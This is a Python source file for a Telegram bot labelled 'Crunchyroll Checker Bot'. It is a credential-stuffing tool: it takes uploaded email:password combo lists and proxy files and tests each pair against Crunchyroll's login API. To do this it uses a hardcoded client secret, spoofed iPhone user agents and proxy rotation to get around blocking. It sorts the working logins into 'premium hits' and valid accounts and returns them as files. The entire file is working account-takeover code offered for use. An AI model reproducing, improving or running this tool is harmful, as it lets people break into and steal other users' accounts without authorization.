#!/usr/bin/env python3
import requests
import uuid
import random
import re
import os
import threading
import time
from queue import Queue
from urllib.parse import urlparse, quote

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

DEBUG_MODE = False

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

AUTHORIZED_USERS_STR = os.environ.get("AUTHORIZED_USERS", "")
AUTHORIZED_USERS = []
if AUTHORIZED_USERS_STR:
    AUTHORIZED_USERS = [int(uid.strip()) for uid in AUTHORIZED_USERS_STR.split(",") if uid.strip()]

check_queue = Queue()
results = {}
results_lock = threading.Lock()

IPHONE_USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
]


def get_random_user_agent():
    return random.choice(IPHONE_USER_AGENTS)


def generate_guid():
    return str(uuid.uuid4())


def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    proxy_types = ["socks5", "socks4", "https", "http"]
    proxy_type = "http"

    has_scheme = any(proxy_str.lower().startswith(f"{pt}://") for pt in proxy_types)

    if has_scheme:
        for pt in proxy_types:
            if proxy_str.lower().startswith(f"{pt}://"):
                proxy_type = pt
                break
        try:
            parsed = urlparse(proxy_str)
            host = parsed.hostname
            port = parsed.port
            username = parsed.username
            password = parsed.password

            if not host or not port:
                return None

            if username and password:
                proxy_url = f"{proxy_type}://{quote(username, safe='')}:{quote(password, safe='')}@{host}:{port}"
            elif username:
                proxy_url = f"{proxy_type}://{quote(username, safe='')}@{host}:{port}"
            else:
                proxy_url = f"{proxy_type}://{host}:{port}"

            return {"http": proxy_url, "https": proxy_url}
        except Exception:
            return None

    auth = None
    host_port = proxy_str

    if "@" in proxy_str:
        auth_part, host_port = proxy_str.rsplit("@", 1)
        auth = auth_part

    parts = host_port.split(":")

    if len(parts) == 4:
        host = parts[0]
        port = parts[1]
        auth = f"{parts[2]}:{parts[3]}"
    elif len(parts) == 2:
        host = parts[0]
        port = parts[1]
    else:
        return None

    try:
        int(port)
    except ValueError:
        return None

    if auth:
        if ":" in auth:
            user, passwd = auth.split(":", 1)
            proxy_url = f"{proxy_type}://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
        else:
            proxy_url = f"{proxy_type}://{quote(auth, safe='')}@{host}:{port}"
    else:
        proxy_url = f"{proxy_type}://{host}:{port}"

    return {"http": proxy_url, "https": proxy_url}


def check_account(email, password, proxy=None):
    user_agent = get_random_user_agent()
    guid = generate_guid()

    headers_token = {
        "Host": "beta-api.crunchyroll.com",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=1.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Etp-Anonymous-Id": guid,
        "User-Agent": user_agent,
    }

    data_token = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "offline_access",
        "client_id": "ajcylfwdtjjtq7qpgks3",
        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
        "device_id": guid,
        "device_name": "IPhone",
        "device_type": "IPhone",
    }

    try:
        response = requests.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=headers_token,
            data=data_token,
            proxies=proxy,
            timeout=30,
        )

        if "invalid_credentials" in response.text or "force_password_reset" in response.text:
            return ("FAIL", None)

        if "Request blocked" in response.text:
            return ("RETRY", None)

        if "access_token" not in response.text:
            return ("FAIL", None)

        json_resp = response.json()
        access_token = json_resp.get("access_token", "")

    except Exception:
        return ("RETRY", None)

    headers_account = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "User-Agent": user_agent,
    }

    try:
        response = requests.get(
            "https://beta-api.crunchyroll.com/accounts/v1/me",
            headers=headers_account,
            proxies=proxy,
            timeout=30,
        )

        json_resp = response.json()
        external_id = json_resp.get("external_id", "")

        if not external_id:
            return ("FAIL", None)

    except Exception:
        return ("RETRY", None)

    subs_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"

    try:
        response = requests.get(
            subs_url,
            headers=headers_account,
            proxies=proxy,
            timeout=30,
        )

        resp_text = response.text

        if (
            "subscription.not_found" in resp_text
            or "Subscription Not Found" in resp_text
            or '"items":[]' in resp_text
        ):
            custom_line = f"{email}:{password}"
            return ("CUSTOM", custom_line)

        plan = ""
        duration = ""

        try:
            subs_json = response.json()
            items = subs_json.get("items", [])
            if items:
                first_item = items[0]
                product = first_item.get("product", {})

                plan = product.get("name", "")
                duration = product.get("cycle_duration", "")

                if not plan:
                    plan = product.get("sku", "") or first_item.get("sku", "")
                if not duration:
                    duration = first_item.get("cycle_duration", "") or first_item.get("duration", "")
        except Exception:
            pass

        if not plan:
            name_match = re.search(r'"items"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', resp_text, re.DOTALL)
            if name_match:
                plan = name_match.group(1)
            else:
                name_match = re.search(r'"name"\s*:\s*"([^"]+)"', resp_text)
                if name_match:
                    plan = name_match.group(1)

        if not duration:
            duration_match = re.search(r'"cycle_duration"\s*:\s*"([^"]+)"', resp_text)
            if duration_match:
                duration = duration_match.group(1)

        if not plan:
            plan = "Premium"
        if not duration:
            duration = "Active"

        plan_names = {
            "cr_fan": "Fan",
            "cr_fanpack": "Fan Pack",
            "cr_mega_fan": "Mega Fan",
            "cr_megafan": "Mega Fan",
            "cr_megafanpack": "Mega Fan Pack",
            "cr_ultimate_fan": "Ultimate Fan",
            "cr_ultimatefan": "Ultimate Fan",
            "cr_ultimatefanpack": "Ultimate Fan Pack",
            "fan": "Fan",
            "fanpack": "Fan Pack",
            "mega_fan": "Mega Fan",
            "megafan": "Mega Fan",
            "mega fan": "Mega Fan",
            "megafanpack": "Mega Fan Pack",
            "ultimate_fan": "Ultimate Fan",
            "ultimatefan": "Ultimate Fan",
            "ultimate fan": "Ultimate Fan",
            "ultimatefanpack": "Ultimate Fan Pack",
        }
        plan_lower = plan.lower().strip()
        plan_display = plan_names.get(plan_lower, plan.replace("_", " ").title())

        duration_map = {
            "P1M": "1 Month",
            "P3M": "3 Months",
            "P6M": "6 Months",
            "P1Y": "1 Year",
            "P2Y": "2 Years",
        }
        duration_display = duration_map.get(duration.upper(), duration)

        hit_line = f"{email}:{password} | {plan_display} | {duration_display}"
        return ("SUCCESS", hit_line)

    except Exception:
        return ("RETRY", None)


def _empty_result():
    return {
        "SUCCESS": 0,
        "CUSTOM": 0,
        "FAIL": 0,
        "RETRY": 0,
        "total": 0,
        "hits": [],
        "customs": [],
    }


def worker():
    """Background worker that processes combos from the queue."""
    while True:
        try:
            item = check_queue.get(timeout=1)
        except Exception:
            continue

        user_id = item["user_id"]
        email = item["email"]
        password = item["password"]
        proxy = item.get("proxy")

        result, data = check_account(email, password, proxy)

        with results_lock:
            if user_id not in results:
                results[user_id] = _empty_result()

            results[user_id][result] += 1
            results[user_id]["total"] += 1

            if result == "SUCCESS" and data:
                results[user_id]["hits"].append(data)

            if result == "CUSTOM" and data:
                results[user_id]["customs"].append(data)

        check_queue.task_done()


def is_authorized(user_id: int) -> bool:
    if not AUTHORIZED_USERS:
        return True
    return user_id in AUTHORIZED_USERS


# --------------- Telegram Bot Command Handlers ---------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    welcome_msg = (
        "*Crunchyroll Checker Bot*\n\n"
        "This bot checks Crunchyroll accounts from combo files\\.\n\n"
        "*Commands:*\n"
        "/start \\- Start the bot\n"
        "/help \\- Show help and commands\n"
        "/check \\- Begin checking accounts\n"
        "/status \\- View current check progress\n"
        "/results \\- View results so far\n"
        "/clear \\- Clear your results\n"
        "/stats \\- Bot statistics\n\n"
        "*How to use:*\n"
        "1\\. Send /check\n"
        "2\\. Upload a combo file \\(email:pass format\\)\n"
        "3\\. Checking begins automatically\n"
    )
    await update.message.reply_text(welcome_msg, parse_mode=ParseMode.MARKDOWN_V2)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    help_text = (
        "<b>Commands Detail:</b>\n\n"
        "/start - Initialize the bot\n"
        "/help - This help message\n"
        "/check - Start a new check\n"
        "/noproxy - Check without proxies\n"
        "/withproxy - Check with proxies (send proxy file first)\n"
        "/status - View current progress\n"
        "/results - List of hits and customs\n"
        "/clear - Clear your results\n"
        "/stats - Bot usage statistics\n\n"
        "<b>File Format:</b>\n"
        "Combo file must be in email:password format\n"
        "Example: email@example.com:password123\n\n"
        "<b>Results Legend:</b>\n"
        "SUCCESS - Premium accounts with subscription\n"
        "CUSTOM - Valid accounts without subscription\n"
        "FAIL - Invalid credentials\n"
        "RETRY - Blocked/Error\n"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    with results_lock:
        if user_id not in results:
            results[user_id] = _empty_result()

    await update.message.reply_text(
        "<b>Send your Combo File</b>\n\n"
        "Upload a file with one email:password per line.\n\n"
        "Example:\n"
        "<code>email1@gmail.com:pass123</code>\n"
        "<code>email2@yahoo.com:pass456</code>\n\n"
        "Want to use proxies? Send /noproxy or /withproxy first.",
        parse_mode=ParseMode.HTML,
    )

    context.user_data["waiting_for_combo"] = True
    context.user_data["use_proxy"] = False


async def noproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    context.user_data["use_proxy"] = False
    context.user_data["waiting_for_combo"] = True
    await update.message.reply_text(
        "Proxies disabled. Now send your combo file.",
        parse_mode=ParseMode.HTML,
    )


async def withproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    context.user_data["use_proxy"] = True
    context.user_data["waiting_for_proxy"] = True
    await update.message.reply_text(
        "<b>Send your Proxy File</b>\n\n"
        "One proxy per line:\n"
        "<code>ip:port</code> or <code>protocol://user:pass@ip:port</code>\n\n"
        "After proxy file, send your combo file.",
        parse_mode=ParseMode.HTML,
    )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    if not context.user_data.get("waiting_for_combo") and not context.user_data.get("waiting_for_proxy"):
        await update.message.reply_text("Please use /check first before sending files.")
        return

    doc = update.message.document
    file = await context.bot.get_file(doc.file_id)

    if context.user_data.get("waiting_for_proxy", False):
        proxy_path = f"/tmp/proxy_{user_id}.txt"
        await file.download_to_drive(proxy_path)

        proxies = []
        with open(proxy_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line:
                    parsed = parse_proxy(line)
                    if parsed:
                        proxies.append(parsed)

        try:
            os.remove(proxy_path)
        except OSError:
            pass

        if proxies:
            context.user_data["proxies"] = proxies
            await update.message.reply_text(f"{len(proxies)} proxies loaded! Now send your combo file.")
            context.user_data["waiting_for_proxy"] = False
            context.user_data["waiting_for_combo"] = True
        else:
            await update.message.reply_text("No valid proxies found in file. Try again with /withproxy")
            context.user_data["waiting_for_proxy"] = False

    elif context.user_data.get("waiting_for_combo", False):
        combo_path = f"/tmp/combo_{user_id}.txt"
        await file.download_to_drive(combo_path)

        combos = []
        with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        email, password = parts
                        combos.append((email.strip(), password.strip()))

        try:
            os.remove(combo_path)
        except OSError:
            pass

        if combos:
            await update.message.reply_text(f"<b>{len(combos)} combos loaded!</b>\nChecking started...", parse_mode=ParseMode.HTML)

            proxies = context.user_data.get("proxies", [])
            proxy_index = 0

            for email, password in combos:
                proxy = None
                if proxies and context.user_data.get("use_proxy", False):
                    proxy = proxies[proxy_index % len(proxies)]
                    proxy_index += 1

                check_queue.put({
                    "user_id": user_id,
                    "email": email,
                    "password": password,
                    "proxy": proxy,
                })

            await update.message.reply_text(
                f"{len(combos)} accounts queued. Use /status to check progress."
            )
        else:
            await update.message.reply_text("No valid combos found. Ensure file uses email:password format.")

        context.user_data["waiting_for_combo"] = False
        context.user_data.pop("proxies", None)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    with results_lock:
        r = results.get(user_id)

    if r:
        status_msg = (
            f"<b>Current Status</b>\n\n"
            f"Total Checked: {r['total']}\n"
            f"SUCCESS (Premium): {r['SUCCESS']}\n"
            f"CUSTOM (Valid): {r['CUSTOM']}\n"
            f"FAIL: {r['FAIL']}\n"
            f"RETRY: {r['RETRY']}\n\n"
            f"Queue size: {check_queue.qsize()}"
        )
    else:
        status_msg = "No checks have been run yet."

    await update.message.reply_text(status_msg, parse_mode=ParseMode.HTML)


async def results_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    with results_lock:
        r = results.get(user_id)

    if not r or (not r["hits"] and not r["customs"]):
        await update.message.reply_text("No results found yet.")
        return

    if r["hits"]:
        hits_preview = "\n".join(r["hits"][:10])
        hits_text = f"<b>Premium Hits:</b>\n<code>{hits_preview}</code>"
        if len(r["hits"]) > 10:
            hits_text += f"\n...and {len(r['hits']) - 10} more"
        await update.message.reply_text(hits_text, parse_mode=ParseMode.HTML)

    if r["customs"]:
        customs_preview = "\n".join(r["customs"][:10])
        customs_text = f"<b>Custom Accounts:</b>\n<code>{customs_preview}</code>"
        if len(r["customs"]) > 10:
            customs_text += f"\n...and {len(r['customs']) - 10} more"
        await update.message.reply_text(customs_text, parse_mode=ParseMode.HTML)

    if r["hits"]:
        hits_path = f"/tmp/hits_{user_id}.txt"
        with open(hits_path, "w") as f:
            for hit in r["hits"]:
                f.write(hit + "\n")
        with open(hits_path, "rb") as f:
            await update.message.reply_document(f, filename="hits.txt")
        try:
            os.remove(hits_path)
        except OSError:
            pass

    if r["customs"]:
        customs_path = f"/tmp/customs_{user_id}.txt"
        with open(customs_path, "w") as f:
            for c in r["customs"]:
                f.write(c + "\n")
        with open(customs_path, "rb") as f:
            await update.message.reply_document(f, filename="customs.txt")
        try:
            os.remove(customs_path)
        except OSError:
            pass


async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    with results_lock:
        if user_id in results:
            results[user_id] = _empty_result()

    await update.message.reply_text("Your results have been cleared.")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Unauthorized access.")
        return

    with results_lock:
        total_users = len(results)
        total_checked = sum(r["total"] for r in results.values())
        total_hits = sum(len(r["hits"]) for r in results.values())
        total_customs = sum(len(r["customs"]) for r in results.values())

    stats_msg = (
        f"<b>Bot Statistics</b>\n\n"
        f"Active users: {total_users}\n"
        f"Total accounts checked: {total_checked}\n"
        f"Total premium hits: {total_hits}\n"
        f"Total custom accounts: {total_customs}\n"
        f"Queue size: {check_queue.qsize()}"
    )
    await update.message.reply_text(stats_msg, parse_mode=ParseMode.HTML)


def main():
    if not BOT_TOKEN:
        print("ERROR: BOT_TOKEN environment variable is not set.")
        print("Set it with: export BOT_TOKEN='your-bot-token-here'")
        raise SystemExit(1)

    worker_thread = threading.Thread(target=worker, daemon=True)
    worker_thread.start()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("noproxy", noproxy))
    app.add_handler(CommandHandler("withproxy", withproxy))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("results", results_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
